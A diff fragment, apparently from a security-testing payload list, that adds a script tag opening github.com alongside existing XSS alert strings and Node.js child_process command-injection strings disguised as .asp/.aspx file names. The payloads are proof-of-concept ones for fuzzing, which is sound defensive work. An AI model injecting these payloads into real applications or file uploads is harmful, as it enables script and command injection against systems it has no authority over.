@@ -3,6 +3,7 @@
 <script>alert(hemked)</script>.asp
 require('child_process').exec('start calc');.asp
 require('child_process').exec('start calc');.aspx
+<script>document.open("https://www.github.com", "", "noopener=true");</script>
 <script>alert(NFSU)</script>
 <script>alert(NFSU)</script>
 <script>alert(NFSU)</script>
